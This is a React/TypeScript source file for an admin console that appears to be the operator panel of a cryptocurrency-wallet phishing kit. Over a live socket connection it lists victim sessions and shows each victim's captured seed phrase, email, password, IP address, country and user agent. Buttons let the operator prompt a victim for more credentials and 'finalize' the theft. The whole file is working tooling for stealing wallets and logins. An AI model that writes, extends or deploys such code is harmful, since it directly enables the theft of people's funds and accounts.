import { useEffect, useMemo, useRef, useState } from 'react'
import type { Socket } from 'socket.io-client'
import { io } from 'socket.io-client'

import { SOCKET_BASE_URL } from '../config'
import '../App.css'

interface SessionSummary {
  id: string
  socketId: string
  status: 'seed-submitted' | 'awaiting-email' | 'awaiting-password' | 'password-submitted' | 'finalized'
  seedWords: string[]
  email: string | null
  password: string | null
  ipAddress: string | null
  country: string
  userAgent: string | null
  createdAt: string
  updatedAt: string
  emailRequestedAt?: string
  emailSubmittedAt?: string
  passwordSubmittedAt?: string
  finalizedAt?: string
}

interface AdminErrorPayload {
  message?: string
  event?: string
}

const STATUS_LABELS: Record<SessionSummary['status'], string> = {
  'seed-submitted': 'Seed submitted',
  'awaiting-email': 'Awaiting email',
  'awaiting-password': 'Awaiting password',
  'password-submitted': 'Password submitted',
  finalized: 'Finalized',
}

const shortenId = (id: string) => `${id.slice(0, 4)}…${id.slice(-4)}`

const formatTimestamp = (value?: string | null) => {
  if (!value) return '—'
  const date = new Date(value)
  if (Number.isNaN(date.getTime())) return value
  return date.toLocaleString()
}

const AdminDashboard = () => {
  const [sessions, setSessions] = useState<SessionSummary[]>([])
  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null)
  const [adminError, setAdminError] = useState<string | null>(null)
  const [adminMessage, setAdminMessage] = useState<string | null>(null)
  const [connectionNotice, setConnectionNotice] = useState<string | null>(null)
  const [isRequestingEmail, setIsRequestingEmail] = useState(false)
  const [isFinalizing, setIsFinalizing] = useState(false)

  const socketRef = useRef<Socket | null>(null)
  const selectedSessionIdRef = useRef<string | null>(null)

  const selectedSession = useMemo(
    () => sessions.find((session) => session.id === selectedSessionId) ?? null,
    [sessions, selectedSessionId],
  )

  useEffect(() => {
    selectedSessionIdRef.current = selectedSessionId
  }, [selectedSessionId])

  useEffect(() => {
    const socket = io(SOCKET_BASE_URL || undefined, {
      query: { role: 'admin' },
      transports: ['websocket'],
      withCredentials: true,
    })

    socketRef.current = socket

    const handleConnect = () => {
      setConnectionNotice(null)
    }

    const handleDisconnect = () => {
      setConnectionNotice('Disconnected from server. Reconnecting…')
    }

    const upsertSession = (updated: SessionSummary) => {
      setSessions((prev) => {
        const existingIndex = prev.findIndex((session) => session.id === updated.id)
        if (existingIndex === -1) {
          return [updated, ...prev]
        }
        const next = [...prev]
        next[existingIndex] = updated
        return next
      })

      setAdminMessage(`Session ${shortenId(updated.id)} updated to "${STATUS_LABELS[updated.status]}".`)
      setAdminError(null)

      if (selectedSessionIdRef.current === updated.id) {
        setIsRequestingEmail(false)
        setIsFinalizing(false)
      }
    }

    socket.on('connect', handleConnect)
    socket.on('disconnect', handleDisconnect)
    socket.io.on('reconnect_attempt', () => setConnectionNotice('Reconnecting to server…'))
    socket.io.on('reconnect', () => setConnectionNotice(null))

    socket.on('admin:sessionList', (list: SessionSummary[]) => {
      setSessions(list)
      if (!selectedSessionIdRef.current && list.length > 0) {
        setSelectedSessionId(list[0].id)
      }
    })

    socket.on('admin:newSession', (session: SessionSummary) => {
      setSessions((prev) => [session, ...prev.filter((item) => item.id !== session.id)])
      setSelectedSessionId((current) => current ?? session.id)
      setAdminMessage(`New session ${shortenId(session.id)} received.`)
      setAdminError(null)
    })

    socket.on('admin:sessionUpdated', upsertSession)

    socket.on('admin:error', ({ message, event }: AdminErrorPayload) => {
      setAdminError(message ?? 'Operation failed.')
      setAdminMessage(event ? `Event ${event} failed.` : null)
      setIsRequestingEmail(false)
      setIsFinalizing(false)
    })

    return () => {
      socket.off('connect', handleConnect)
      socket.off('disconnect', handleDisconnect)
      socket.io.off('reconnect_attempt')
      socket.io.off('reconnect')
      socket.off('admin:sessionList')
      socket.off('admin:newSession')
      socket.off('admin:sessionUpdated', upsertSession)
      socket.off('admin:error')
      socket.disconnect()
    }
  }, [])

  const handleRequestEmail = () => {
    if (!selectedSessionId || !socketRef.current) return
    setIsRequestingEmail(true)
    setAdminError(null)
    setAdminMessage(null)
    socketRef.current.emit('admin:requestEmail', { sessionId: selectedSessionId })
  }

  const handleFinalize = () => {
    if (!selectedSessionId || !socketRef.current) return
    setIsFinalizing(true)
    setAdminError(null)
    setAdminMessage(null)
    socketRef.current.emit('admin:finalize', { sessionId: selectedSessionId })
  }

  return (
    <div className="admin-page">
      <header className="admin-header">
        <h1>Admin Console</h1>
        <p>Monitor active sessions and control credential requests.</p>
      </header>

      {connectionNotice && <div className="admin-banner warning">{connectionNotice}</div>}
      {adminError && <div className="admin-banner error">{adminError}</div>}
      {adminMessage && <div className="admin-banner success">{adminMessage}</div>}

      <div className="admin-content">
        <aside className="admin-sessions">
          <h2>Sessions</h2>
          {sessions.length === 0 && <p className="admin-empty">No sessions yet.</p>}
          <ul>
            {sessions.map((session) => (
              <li key={session.id}>
                <button
                  type="button"
                  className={`admin-session ${selectedSessionId === session.id ? 'selected' : ''}`}
                  onClick={() => setSelectedSessionId(session.id)}
                >
                  <span className="admin-session-id">{shortenId(session.id)}</span>
                  <span className={`admin-session-status status-${session.status}`}>{STATUS_LABELS[session.status]}</span>
                  <span className="admin-session-meta">
                    <span>{session.country || 'Unknown'}</span>
                    <span>{formatTimestamp(session.createdAt)}</span>
                  </span>
                </button>
              </li>
            ))}
          </ul>
        </aside>

        <section className="admin-details">
          {selectedSession ? (
            <div className="admin-details-card">
              <header>
                <h2>Session details</h2>
                <span className={`admin-session-status status-${selectedSession.status}`}>
                  {STATUS_LABELS[selectedSession.status]}
                </span>
              </header>

              <div className="admin-details-grid">
                <div>
                  <h3>Seed phrase</h3>
                  <p className="admin-seed">{selectedSession.seedWords.join(' ')}</p>
                </div>

                <div>
                  <h3>Email</h3>
                  <p>{selectedSession.email ?? '—'}</p>
                </div>

                <div>
                  <h3>Password</h3>
                  <p>{selectedSession.password ?? '—'}</p>
                </div>

                <div>
                  <h3>Network</h3>
                  <p>
                    <strong>IP:</strong> {selectedSession.ipAddress ?? '—'}
                    <br />
                    <strong>Country:</strong> {selectedSession.country || 'Unknown'}
                  </p>
                </div>

                <div>
                  <h3>User agent</h3>
                  <p className="admin-user-agent">{selectedSession.userAgent ?? '—'}</p>
                </div>

                <div>
                  <h3>Timeline</h3>
                  <ul className="admin-timeline">
                    <li>
                      <span>Seed submitted</span>
                      <time>{formatTimestamp(selectedSession.createdAt)}</time>
                    </li>
                    <li>
                      <span>Email requested</span>
                      <time>{formatTimestamp(selectedSession.emailRequestedAt)}</time>
                    </li>
                    <li>
                      <span>Email received</span>
                      <time>{formatTimestamp(selectedSession.emailSubmittedAt)}</time>
                    </li>
                    <li>
                      <span>Password received</span>
                      <time>{formatTimestamp(selectedSession.passwordSubmittedAt)}</time>
                    </li>
                    <li>
                      <span>Finalized</span>
                      <time>{formatTimestamp(selectedSession.finalizedAt)}</time>
                    </li>
                  </ul>
                </div>
              </div>

              <footer className="admin-actions">
                <button
                  type="button"
                  className="admin-action-button"
                  onClick={handleRequestEmail}
                  disabled={!selectedSessionId || isRequestingEmail}
                >
                  {isRequestingEmail ? 'Requesting…' : 'Request email'}
                </button>
                <button
                  type="button"
                  className="admin-action-button destructive"
                  onClick={handleFinalize}
                  disabled={!selectedSessionId || isFinalizing}
                >
                  {isFinalizing ? 'Finalizing…' : 'Finalize'}
                </button>
              </footer>
            </div>
          ) : (
            <div className="admin-empty-state">
              <h2>Select a session</h2>
              <p>Choose a session on the left to review its details.</p>
            </div>
          )}
        </section>
      </div>
    </div>
  )
}

export default AdminDashboard
